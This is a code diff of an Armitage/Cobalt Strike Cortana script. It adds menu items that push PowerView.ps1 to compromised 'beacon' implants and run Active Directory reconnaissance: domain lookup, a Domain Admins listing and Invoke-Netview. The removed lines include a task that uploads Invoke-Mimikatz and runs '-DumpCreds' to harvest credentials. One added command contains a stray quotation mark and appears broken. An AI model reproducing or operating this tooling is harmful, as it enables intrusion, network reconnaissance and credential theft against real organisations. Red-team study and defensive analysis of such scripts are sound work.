@@ -1,27 +1,4 @@
-import msf.*;
-import java.awt.*;
-import java.io.*;
-import java.net.*;
-import javax.swing.*;
-import javax.imageio.*;
-import ui.*;
-import console.*;
-import armitage.*;
-
-import cloudstrike.*;
-
-on heartbeat_10s {
-    local('@beacons $beacon $bid %data @new @all');
-
-    # grab all beacon ids AND build a map between ids and data
-    @beacons = beacons();
-    foreach $beacon (@beacons) {
-    $bid = $beacon['id'];
-    %data[$bid] = $beacon;
-    push(@all, $bid);
-    }
-}
-
+# task our our beacon to import the specified powershell script
 sub task_powershell_import {
     # task ID ($1) with powershell command + args ($2)
     local('$id $len');
@@ -31,143 +8,68 @@ sub task_powershell_import {
     $len = strlen($data);
 
     # task beacon to import the PowerShell script
-    call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
-    call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
+    call("beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
+    call("beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
 }
 
+# task our beacon to execute a given powershell command
 sub task_powershell {
 
     $id = $1;
     $len  = strlen($2);
 
-    call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
-    call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
+    call("beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
+    call("beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
 }
 
-popup beacon_top {
-   item "Get Domain" {
-      local('$bid');
-      foreach $bid ($1) {
-         task_get_domain($bid);
-      }
-   }
+sub task_enum_dom {
+   $beacon_id = $1;
 
-   item "Get Domain Controllers" {
-      local('$bid');
-      foreach $bid ($1) {
-         task_get_dcs($bid);
-      }
-   }
+   $script_source = script_resource("PowerView.ps1");
 
-   item "Get Domain Admins" {
-      local('$bid');
-      foreach $bid ($1) {
-         task_get_admins($bid);
-      }
-   }
+   # get all of our data that we're going to upload
+   $handle = openf($script_source);
+   $data = readb($handle, -1);
+   closef($handle);
 
-   item "Invoke-NetView" {
-      local('$bid');
-      foreach $bid ($1) {
-         task_netview($bid);
-      }
-   }
+   # task the beacon to import the powershell data
+   task_powershell_import($beacon_id, $data);
 
-   item "Invoke-Mimikatz" {
-      local('$bid');
-      foreach $bid ($1) {
-         task_mimikatz($bid);
-      }
-   }
-}
-
-# tasks
-sub task_get_domain {
-    $beacon_id = $1;
-
-    $script_source = script_resource("PowerView.ps1");
-
-    # get all of our data that we're going to upload
-    $handle = openf($script_source);
-    $data = readb($handle, -1);
-    closef($handle);
-
-    # task the beacon to import the powershell data
-    task_powershell_import($beacon_id, $data);
-
-    # actually task the beacon
-    task_powershell($beacon_id, "Get-NetDomain");
-}
-
-sub task_get_dcs {
-    $beacon_id = $1;
-
-    $script_source = script_resource("PowerView.ps1");
-
-    # get all of our data that we're going to upload
-    $handle = openf($script_source);
-    $data = readb($handle, -1);
-    closef($handle);
-
-    # task the beacon to import the powershell data
-    task_powershell_import($beacon_id, $data);
-
-    # actually task the beacon
-    task_powershell($beacon_id, "Get-NetDomainControllers");
-}
-
-sub task_get_admins {
-    $beacon_id = $1;
-
-    $script_source = script_resource("PowerView.ps1");
-
-    # get all of our data that we're going to upload
-    $handle = openf($script_source);
-    $data = readb($handle, -1);
-    closef($handle);
-
-    # task the beacon to import the powershell data
-    task_powershell_import($beacon_id, $data);
-
-    # actually task the beacon
-    task_powershell($beacon_id, 'Get-NetGroup -GroupName "Domain Admins"');
+   # actually task the beacon
+   task_powershell($beacon_id, 'Get-NetDomain"');
+   task_powershell($beacon_id, 'Get-NetGroup -GroupName "Domain Admins"');
 }
 
 sub task_netview {
-    $beacon_id = $1;
+   $beacon_id = $1;
 
-    if (-exists script_resource("/beacon/PowerView.ps1")){
-       $script_source = script_resource("/beacon/PowerView.ps1");
-    }
-    else{
-        $script_source = script_resource("PowerView.ps1");
-    }
+   $script_source = script_resource("PowerView.ps1");
 
-    # get all of our data that we're going to upload
-    $handle = openf($script_source);
-    $data = readb($handle, -1);
-    closef($handle);
+   # get all of our data that we're going to upload
+   $handle = openf($script_source);
+   $data = readb($handle, -1);
+   closef($handle);
 
-    # task the beacon to import the powershell data
-    task_powershell_import($beacon_id, $data);
+   # task the beacon to import the powershell data
+   task_powershell_import($beacon_id, $data);
 
-    # actually task the beacon
-    task_powershell($beacon_id, "Invoke-Netview -Ping -ExcludeShares -Delay 10");
+   # actually task the beacon
+   task_powershell($beacon_id, "Invoke-Netview -Ping -ExcludeShares -Delay 10");
 }
 
-sub task_mimikatz {
-    $beacon_id = $1;
+###
+popup beacon_top {
+   item "Enum Domain" {
+     local('$bid');
+     foreach $bid ($1) {
+        task_enum_dom($bid);
+     }
+   }
 
-    $script_source = script_resource("Invoke-Mimikatz.ps1");
-
-    # get all of our data that we're going to upload
-    $handle = openf($script_source);
-    $data = readb($handle, -1);
-    closef($handle);
-
-    # task the beacon to import the powershell data
-    task_powershell_import($beacon_id, $data);
-
-    # actually task the beacon
-    task_powershell($beacon_id, "Invoke-Mimikatz -DumpCreds");
+   item "Invoke-NetView" {
+     local('$bid');
+     foreach $bid ($1) {
+        task_netview($bid);
+     }
+   }
 }
